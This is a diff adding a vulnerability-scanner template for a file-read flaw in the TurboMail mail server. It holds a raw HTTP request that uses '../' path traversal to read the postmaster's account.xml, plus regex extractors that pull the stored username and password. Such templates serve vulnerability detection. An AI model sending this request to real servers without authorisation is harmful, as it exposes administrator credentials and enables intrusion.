@@ -1,0 +1,38 @@
+id: turbomail-viewfile-file-read
+
+info:
+  name: TurboMail Viewfile File Reading Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    TurboMail mail system is an email server system developed for the communication needs of enterprises and institutions. This vulnerability allows attackers to read the configuration file and potentially decrypt credentials using base64 decryption.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en-US;q=0.9,en;q=0.8
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<username>"
+          - "<password>"
+          - "smtp"
+
+    extractors:
+      - type: regex
+        name: username
+        part: body
+        regex:
+          - "(?s)<username>(.*?)</username>"
+      - type: regex
+        name: password
+        part: body
+        regex:
+          - "(?s)<password>(.*?)</password>"
+        group: 1
